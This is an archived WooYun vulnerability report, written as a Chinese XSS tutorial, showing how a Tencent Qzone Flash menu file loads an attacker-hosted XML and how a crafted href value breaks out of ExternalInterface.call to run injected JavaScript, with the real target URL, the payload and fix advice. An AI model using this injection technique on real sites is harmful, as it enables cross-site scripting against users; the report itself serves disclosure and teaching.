@@ -1,0 +1,394 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 16. Flash Xss进阶 [ExternalInterface.call第二个参数]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 16. Flash Xss进阶 [ExternalInterface.call第二个参数]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-27 17:33</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-27：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-28：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-07：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-17：	细节向普通白帽子公开<br/>
+									2013-01-27：	细节向实习白帽子公开<br/>
+									2013-02-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">讲完ExternalInterface.call的第一个参数，我们接着来讲第“2”个参数，之所以2打上引号，因为 call 函数的原型是：call(functionName:String, ... arguments):*， 即后面可以有很多很多个参数，我们统称为第2个参数。有时候我们会遇到ExternalInterface.call(&quot;xxxxx&quot;,&quot;可控内容&quot;);的情况，那么这种情况下，如何构造XSS呢？</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 有了上一节教程的基础，这次我们直接见实例。<br />
+<br />
+<br />
+<br />
+通过GOOGLE搜索，site:qq.com filetype:swf inurl:xml<br />
+<br />
+<br />
+<br />
+我们可以找到以下FLASH。<br />
+<br />
+<br />
+<br />
+http://imgcache.qq.com/qzone_v4/2/default_menu_horizontal.swf?xml_path=http://imgcache.qq.com/qzone/client/custom_menu/custom_menu.xml<br />
+<br />
+<br />
+<br />
+2. 借鉴上上节教程的思路，我们可以看看http://imgcache.qq.com/qzone/client/custom_menu/custom_menu.xml里是个什么内容。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/27173004189d5c09cba0081adc34a833519c5906.jpg" target="_blank"><img src="../images/27173004189d5c09cba0081adc34a833519c5906.jpg" alt="82.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 好像看不出来是个啥用途，我们反编译FLASH文件。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2717301488c0aa1ab6d3b36f7f0f4e07fe523299.jpg" target="_blank"><img src="../images/2717301488c0aa1ab6d3b36f7f0f4e07fe523299.jpg" alt="83.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 接着我们先看看是否有getURL, ExternalInterface.call之类的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/27173022d7877e44a52da8be74c4671836d2ee8b.jpg" target="_blank"><img src="../images/27173022d7877e44a52da8be74c4671836d2ee8b.jpg" alt="84.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看到，我们搜索到的是下面这句：<br />
+<br />
+<br />
+<br />
+</p><pre><code>flash.external.ExternalInterface.call(&quot;custom_menu_swf&quot;, menu_array[_local2].href);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+那么call的第一个参数是被限定死了～，第2个参数为 menu_array[_local2].href，<br />
+<br />
+<br />
+<br />
+如果你对AS有一点了解，不难看出menu_array是一个数组，那么_local2应该就是数组的下标，<br />
+<br />
+<br />
+<br />
+而从单词含义“菜单数组”我们不难联想到上面xml文件里的数据。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2717303008ca6c5f5744dac17f6583931eb896b1.jpg" target="_blank"><img src="../images/2717303008ca6c5f5744dac17f6583931eb896b1.jpg" alt="85.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 换句话说，这里我们的可以控制call的第2个参数。同教程14中的方法，我们下载下来http://imgcache.qq.com/qzone/client/custom_menu/custom_menu.xml。 先做点修改，然后上传到自己网站上。<br />
+<br />
+<br />
+<br />
+我们将代码里日志那一行的href改掉。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;menu name=&quot;日  志&quot; href=&quot;\&amp;quot;,alert(1)&quot; /&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+上传修改后的文件，同时记得将crossdomain.xml上传至自己的网站根目录下哦～～（见教程14）<br />
+<br />
+<br />
+<br />
+6. 接着我们载入我们自己指定的XML文件。<br />
+<br />
+<br />
+<br />
+http://imgcache.qq.com/qzone_v4/2/default_menu_horizontal.swf?xml_path=http://itsokla.duapp.com/custom_menu.xml<br />
+<br />
+<br />
+<br />
+7. 接着我们打开Firefox浏览器。  有人会问，你怎么突然要用Firefox啊！疯了么！！ 同志们，我没疯，只是因为FF可以捕获到这里的错误，而chrome捕获不到！<br />
+<br />
+<br />
+<br />
+我们打开Firefox后， 访问上面的地址，点击【日志】按钮！！<br />
+<br />
+<br />
+<br />
+Ctrl+shift+J 打开错误控制台！可以看到以下报错！<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/27173101695d748ad1f53009e846b793a70fc938.jpg" target="_blank"><img src="../images/27173101695d748ad1f53009e846b793a70fc938.jpg" alt="86.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8. 记性好的朋友，会马上想起上一节里我们说到的。<br />
+<br />
+<br />
+<br />
+ExternalInterface.call(&quot;函数名&quot;,&quot;参数1&quot;);<br />
+<br />
+<br />
+<br />
+实际上执行的是以下内容，<br />
+<br />
+<br />
+<br />
+</p><pre><code>try { __flash__toXML(函数名(&quot;参数1&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们就是从FF这里捕获错误到这点的！（:) 当然也还会有其他方法）。<br />
+<br />
+<br />
+<br />
+为什么会出错呢? 我们一起来看看。<br />
+<br />
+<br />
+<br />
+9. 当我们点击 【日志】按钮时，会调用。<br />
+<br />
+<br />
+<br />
+flash.external.ExternalInterface.call(&quot;custom_menu_swf&quot;, menu_array[_local2].href);<br />
+<br />
+<br />
+<br />
+而menu_array[_local2].href 等于 \&quot;,alert(1), 进而，我们代入完整的代码，即如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>try { __flash__toXML(custom_menu_swf(&quot;\\&quot;,alert(1)&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+转换过程如下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/27173113c12953e0d7f9e58fa1ffb64deaae667a.jpg" target="_blank"><img src="../images/27173113c12953e0d7f9e58fa1ffb64deaae667a.jpg" alt="87.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看到转换之后，JS代码有点乱，引号到处飞，括号无处寻，因而报错了！<br />
+<br />
+<br />
+<br />
+10. 那么我们怎么构造正确的利用代码呢？其实有上一节的知识并不难！<br />
+<br />
+<br />
+<br />
+</p><pre><code>try { __flash__toXML(custom_menu_swf(&quot;构造点构造点&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+首先第一步，要注入自己代码，首先要闭合掉双引号！<br />
+<br />
+<br />
+<br />
+</p><pre><code>try { __flash__toXML(custom_menu_swf(&quot;构造点&quot;),alert(&quot;构造点&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+但是从上面转换流程，我们可以看到， &quot; 会变成 \&quot;, 即变成了下面的样子，还是突破不出去。<br />
+<br />
+<br />
+<br />
+</p><pre><code>try { __flash__toXML(custom_menu_swf(&quot;构造点\&quot;),alert(\&quot;构造点&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/27173127819d8d6bcda8123b92e438107083663a.jpg" target="_blank"><img src="../images/27173127819d8d6bcda8123b92e438107083663a.jpg" alt="89.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+不过非常庆幸的事情是，这里没有对 \ 进行转义。 我们可以通过输入 \&quot; 来构造。JS的字符串里，\ 用 \\ 表示。如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>try { __flash__toXML(custom_menu_swf(&quot;构造点\\&quot;))}catch(e){alert(1)}//构造点&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+图片分析如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/271731372d5aa18ea65636c4f6fdfddf16f00eac.jpg" target="_blank"><img src="../images/271731372d5aa18ea65636c4f6fdfddf16f00eac.jpg" alt="88.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+11. 罗嗦了这么多，我们把构造点代码，拿出来，插入到XML文件里。注意以下几点：<br />
+<br />
+<br />
+<br />
+11.1 最后构造的代码是\\&quot;, 实际我们的输入是\&quot;，然后由FLASH自己转变为\\&quot;的，因而利用代码里只需要输入\&quot;即可。<br />
+<br />
+<br />
+<br />
+11.2 由于在XML的节点属性里，双引号写为 &amp;quot;<br />
+<br />
+<br />
+<br />
+&lt;menu name=&quot;日  志&quot; href=&quot;构造点\&amp;quot;))}catch(e){alert(1)}//构造点&quot; /&gt;<br />
+<br />
+<br />
+<br />
+12. 再次上传文件。打开<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://imgcache.qq.com/qzone_v4/2/default_menu_horizontal.swf?xml_path=http://itsokla.duapp.com/custom_menu.xml</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+点击日志，看看效果。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/271731462d4c75dd0dee4b9e64c0e818c272cc64.jpg" target="_blank"><img src="../images/271731462d4c75dd0dee4b9e64c0e818c272cc64.jpg" alt="90.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">将详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 传入call第2个参数前，对\进行转义。<br />
+<br />
+2. 禁止调用第三方的外部XML文件。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016598" title="[腾讯实例教程] 那些年我们一起学XSS - 16. Flash Xss进阶 [ExternalInterface.call第二个参数]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-28 15:32</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16598";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
